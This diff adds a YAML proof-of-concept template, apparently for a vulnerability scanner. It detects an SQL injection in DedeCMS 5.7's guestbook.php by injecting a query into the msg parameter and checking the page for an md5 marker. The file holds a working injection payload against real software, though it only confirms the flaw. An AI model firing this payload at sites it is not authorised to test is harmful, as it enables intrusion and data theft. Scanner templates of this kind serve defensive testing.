@@ -1,0 +1,26 @@
+name: poc-yaml-dedecms-guestbook-sqli
+set:
+  r: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: /plus/guestbook.php
+    follow_redirects: true
+    expression: |
+      response.status == 200
+    search: action=admin&id=(?P<articleid>\d{1,20})
+  - method: GET
+    path: /plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(selecT md5({{r}})),email='
+    follow_redirects: true
+    expression: |
+      response.status == 200
+  - method: GET
+    path: /plus/guestbook.php
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
+
+detail:
+  author: harris2015(https://github.com/harris2015)
+  Affected Version: "5.7"
+  links:
+    - https://blog.csdn.net/god_7z1/article/details/8180454
